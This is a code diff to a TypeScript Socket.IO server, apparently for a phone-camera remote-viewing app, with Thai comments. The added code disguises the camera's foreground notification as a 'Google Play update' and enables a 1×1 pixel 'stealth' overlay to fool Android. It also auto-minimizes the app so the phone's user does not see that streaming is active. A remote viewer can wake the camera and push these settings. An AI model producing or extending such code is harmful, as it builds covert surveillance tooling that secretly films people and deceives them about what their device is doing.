@@ -50,6 +50,23 @@ interface CameraInfo {
   socketId: string;
 }
 
+interface CameraConfig {
+  // ข้อความใน foreground service notification (ปลอมเป็น Google Play update)
+  notifTitle: string;
+  notifBody: string;
+  // เปิด 1×1 px overlay หลอกระบบว่าแอป foreground (AirDroid technique)
+  stealthOverlay: boolean;
+  // ย่อ activity ทันทีหลังเปิดกล้อง (user ไม่เห็นหน้า streaming)
+  autoMinimize: boolean;
+}
+
+const DEFAULT_CONFIG: CameraConfig = {
+  notifTitle: 'กำลังอัพเดท Google Play',
+  notifBody: 'กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด',
+  stealthOverlay: true,
+  autoMinimize: true,
+};
+
 // ---- State (in-memory) ----
 
 const rooms = new Map<string, RoomInfo>();
@@ -58,6 +75,10 @@ const cameras = new Map<string, CameraInfo>();
 
 // device_id → FCM token (เก็บถาวรในหน่วยความจำ — รีสตาร์ท server ก็หาย แต่ camera จะส่งใหม่ตอน register-camera)
 const fcmTokens = new Map<string, string>();
+
+// device_id → CameraConfig (viewer เก็บ remote config สำหรับกล้องแต่ละตัว)
+// รีสตาร์ท server หาย → viewer ต้องส่งใหม่ (acceptable trade-off เพื่อความเรียบง่าย)
+const configs = new Map<string, CameraConfig>();
 
 // กัน spam push: device_id → timestamp ล่าสุดที่ส่ง
 const lastPushAt = new Map<string, number>();
@@ -171,8 +192,71 @@ io.on('connection', (socket: Socket) => {
       }
 
       socket.emit('register-camera-ok');
+
+      // ถ้า viewer เคย set config ไว้ (ตอนกล้อง offline) → push ให้กล้องทันที
+      const existingConfig = configs.get(deviceId);
+      if (existingConfig) {
+        socket.emit('config-pushed', existingConfig);
+        console.log(`[register-camera] pushed pending config to ${deviceId.slice(0, 8)}…`);
+      }
     },
   );
+
+  // viewer สั่งปลุกกล้องเอง (กรณีกล้อง offline หรือเปิดไม่ได้)
+  // ต่างจาก auto-wake ใน join — อันนี้ user กดปุ่ม wake manual
+  socket.on('wake-camera', (payload: { deviceId?: string }) => {
+    const deviceId = payload?.deviceId;
+    if (typeof deviceId !== 'string' || deviceId.length < 8) {
+      socket.emit('wake-camera-error', 'device_id ไม่ถูกต้อง');
+      return;
+    }
+    if (!fcmTokens.has(deviceId)) {
+      socket.emit('wake-camera-error', 'ไม่พบ FCM token ของกล้อง — ให้เปิดกล้องครั้งแรกก่อน');
+      return;
+    }
+    console.log(`[wake-camera] manual trigger for ${deviceId.slice(0, 8)}…`);
+    pushWakeCamera(deviceId)
+      .then(() => socket.emit('wake-camera-ok'))
+      .catch((e) => socket.emit('wake-camera-error', (e as Error).message));
+  });
+
+  // viewer ขอ config ปัจจุบันของกล้อง (สำหรับเปิดหน้า Settings)
+  socket.on('get-config', (payload: { deviceId?: string }) => {
+    const deviceId = payload?.deviceId;
+    if (typeof deviceId !== 'string' || deviceId.length < 8) {
+      socket.emit('get-config-error', 'device_id ไม่ถูกต้อง');
+      return;
+    }
+    const config = configs.get(deviceId) ?? DEFAULT_CONFIG;
+    socket.emit('config-current', { deviceId, config });
+  });
+
+  // viewer บันทึก config ใหม่ → เก็บ in-memory + relay ให้กล้องถ้า online
+  socket.on('update-config', (payload: { deviceId?: string; config?: Partial<CameraConfig> }) => {
+    const deviceId = payload?.deviceId;
+    const cfg = payload?.config;
+    if (typeof deviceId !== 'string' || deviceId.length < 8 || !cfg || typeof cfg !== 'object') {
+      socket.emit('update-config-error', 'payload ไม่ถูกต้อง');
+      return;
+    }
+    // merge กับ default — เผื่อ viewer ส่งมาไม่ครบ
+    const merged: CameraConfig = {
+      ...(configs.get(deviceId) ?? DEFAULT_CONFIG),
+      ...cfg,
+    };
+    configs.set(deviceId, merged);
+    console.log(
+      `[update-config] ${deviceId.slice(0, 8)}… title="${merged.notifTitle}" stealth=${merged.stealthOverlay} auto=${merged.autoMinimize}`,
+    );
+
+    // ส่งให้กล้องทันทีถ้า online — ไม่ต้องรอ register-camera รอบหน้า
+    const cam = cameras.get(deviceId);
+    if (cam) {
+      io.to(cam.socketId).emit('config-pushed', merged);
+      console.log(`[update-config] relayed to online camera ${cam.socketId}`);
+    }
+    socket.emit('update-config-ok', merged);
+  });
 
   // viewer แลกรหัสจับคู่เป็น device_id
   socket.on('pair-viewer', (payload: { code?: string }) => {
